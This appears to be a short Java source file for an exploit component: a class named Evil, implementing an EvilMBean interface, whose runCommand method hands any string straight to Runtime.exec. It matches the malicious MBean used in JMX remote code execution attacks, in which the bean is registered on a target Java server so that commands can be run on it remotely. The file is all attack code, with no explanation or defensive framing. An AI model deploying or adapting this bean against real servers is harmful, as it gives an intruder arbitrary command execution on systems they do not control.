import java.io.IOException;

public class Evil implements EvilMBean {

    @Override
    public void runCommand(String cmd) throws IOException {
        Runtime rt   =  Runtime.getRuntime();rt.exec(cmd);
    }
}